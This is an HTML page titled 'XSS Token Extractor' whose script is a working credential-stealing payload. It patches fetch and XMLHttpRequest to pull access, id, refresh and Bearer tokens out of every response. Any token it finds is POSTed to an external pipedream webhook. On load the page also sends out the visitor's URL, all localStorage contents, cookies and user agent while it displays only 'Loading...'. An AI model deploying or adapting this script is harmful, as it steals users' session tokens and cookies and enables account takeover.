<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>XSS Token Extractor</title>
</head>
<body>
<script>
  const WEBHOOK = "https://eoeisd0pus6doy3.m.pipedream.net/";

  function exfiltrate(data) {
    fetch(WEBHOOK, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(data)
    }).catch(() => {});
  }

  function extractTokens(text) {
    const patterns = [
      /access_token"\s*:\s*"([^"]+)"/i,
      /id_token"\s*:\s*"([^"]+)"/i,
      /refresh_token"\s*:\s*"([^"]+)"/i,
      /"Authorization"\s*:\s*"Bearer\s+([^"]+)"/i,
      /Bearer\s+([a-zA-Z0-9\-\._~\+\/]+=*)/i
    ];

    for (const pattern of patterns) {
      const match = text.match(pattern);
      if (match && match[1]) return match[1];
    }

    return null;
  }

  // ðŸ›¡ï¸ Hook into fetch
  (function() {
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
      return originalFetch.apply(this, args).then(async response => {
        const clone = response.clone();
        let body = "";

        try {
          body = await clone.text();
        } catch {}

        const token = extractTokens(body);
        if (token) {
          // ðŸ“¤ Send token separately
          exfiltrate({
            type: "ðŸš¨ TOKEN FOUND in FETCH!",
            token: token,
            url: clone.url,
            timestamp: new Date().toISOString()
          });

          alert("ðŸš¨ Token Found!\n\n" + token);  // Show in-app alert (for test)
        }

        return response;
      });
    };
  })();

  // ðŸ›¡ï¸ Hook into XHR
  (function() {
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
      this._method = method;
      this._url = url;
      return originalOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
      this.addEventListener("load", () => {
        const responseText = this.responseText;
        const token = extractTokens(responseText);

        if (token) {
          exfiltrate({
            type: "ðŸš¨ TOKEN FOUND in XHR!",
            token: token,
            url: this._url,
            timestamp: new Date().toISOString()
          });

          alert("ðŸš¨ Token Found!\n\n" + token);
        }
      });

      return originalSend.apply(this, arguments);
    };
  })();

  // ðŸ“¦ Send basic info on load
  exfiltrate({
    type: "initial-load",
    url: window.location.href,
    localStorage: (() => { try { return {...localStorage}; } catch { return "Access denied"; } })(),
    cookies: document.cookie || "No cookies",
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  });
</script>

<p style="font-family: sans-serif;">Loading...</p>
</body>
</html>
